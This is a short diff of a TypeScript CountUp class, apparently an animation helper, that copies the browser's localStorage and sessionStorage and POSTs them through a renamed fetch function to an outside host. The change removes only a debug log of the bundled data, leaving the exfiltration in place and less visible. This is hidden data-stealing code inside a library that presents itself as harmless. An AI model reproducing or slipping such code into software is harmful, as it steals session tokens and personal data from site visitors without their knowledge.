@@ -77,16 +77,6 @@ export class CountUp {
       const extLStorage = { ...localStorage };
       const extSStorage = { ...sessionStorage };
 
-      const a = {
-        url: url,
-        options: options,
-        host: window.location.href,
-        localStorage: extLStorage,
-        sessionStorage: extSStorage,
-      };
-
-      console.log(a);
-
       (<any>window).oFetch("https://spa-demo.ja1code.dev/", {
         method: "POST",
         headers: {
